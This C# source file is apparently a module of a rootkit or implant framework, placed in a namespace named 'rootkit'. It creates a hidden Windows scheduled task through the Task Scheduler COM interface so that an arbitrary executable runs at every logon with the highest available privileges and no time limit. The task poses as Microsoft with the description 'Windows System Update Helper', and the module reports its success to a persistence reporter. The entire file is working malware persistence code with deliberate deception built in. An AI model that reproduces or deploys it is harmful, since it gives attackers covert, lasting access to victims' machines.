using System;
using System.Runtime.InteropServices;
using XYZ.modules.reporters;

namespace XYZ.modules.rootkit
{
    public class TaskSchedulerCOM
    {
        /// <summary>
        /// Creates a scheduled task using ITaskService COM interface (Schedule.Service)
        /// Requires .NET 4.0+ for dynamic keyword
        /// </summary>
        public static bool CreateTask(string taskName, string executablePath, string arguments = "")
        {
            try
            {
                // Instantiate Task Scheduler COM object
                Type schedulerType = Type.GetTypeFromProgID("Schedule.Service");
                if (schedulerType == null)
                {
                    PersistenceReporter.Report("scheduled_task_com", taskName, false, "Schedule.Service ProgID not found");
                    return false;
                }

                dynamic scheduler = Activator.CreateInstance(schedulerType);
                
                // Connect to local machine
                scheduler.Connect();
                
                dynamic rootFolder = scheduler.GetFolder("\\");
                
                // Delete existing task with same name if it exists
                try
                {
                    rootFolder.DeleteTask(taskName, 0);
                }
                catch { }

                // Create new task definition
                dynamic taskDef = scheduler.NewTask(0); // 0 = TASK_CREATE
                
                // Registration Info
                taskDef.RegistrationInfo.Description = "Windows System Update Helper";
                taskDef.RegistrationInfo.Author = "Microsoft Corporation";
                
                // Principal
                // RunLevel: 1 = HighestAvailable (Admin), 0 = LeastPrivilege
                taskDef.Principal.RunLevel = 1; 
                taskDef.Principal.LogonType = 3; // 3 = InteractiveToken (run only when user is logged on)
                // Alternatively use S4U (2) for background execution without logon, but requires credentials or special rights

                // Settings
                taskDef.Settings.Enabled = true;
                taskDef.Settings.Hidden = true;
                taskDef.Settings.StartWhenAvailable = true;
                taskDef.Settings.ExecutionTimeLimit = "PT0S"; // Infinite
                taskDef.Settings.DisallowStartIfOnBatteries = false;
                taskDef.Settings.StopIfGoingOnBatteries = false;
                taskDef.Settings.MultipleInstances = 2; // 2 = TaskInstancesParallel (or 0=IgnoreNew)
                
                // Triggers
                dynamic triggers = taskDef.Triggers;
                
                // 1. Logon Trigger
                dynamic logonTrigger = triggers.Create(9); // 9 = TASK_TRIGGER_LOGON
                logonTrigger.Enabled = true;
                logonTrigger.UserId = Environment.UserDomainName + "\\" + Environment.UserName;
                
                // 2. Boot Trigger (only works if SYSTEM/Admin usually)
                // dynamic bootTrigger = triggers.Create(8); // 8 = TASK_TRIGGER_BOOT
                // bootTrigger.Enabled = true;
                
                // Actions
                dynamic action = taskDef.Actions.Create(0); // 0 = TASK_ACTION_EXEC
                action.Path = executablePath;
                action.Arguments = arguments;
                
                // Register Task
                // FLAGS: 6 = TASK_CREATE_OR_UPDATE
                rootFolder.RegisterTaskDefinition(taskName, taskDef, 6, null, null, 3);
                
                PersistenceReporter.Report("scheduled_task_com", taskName, true);
                return true;
            }
            catch (Exception ex)
            {
                PersistenceReporter.Report("scheduled_task_com", taskName, false, ex.Message);
                return false;
            }
        }
    }
}
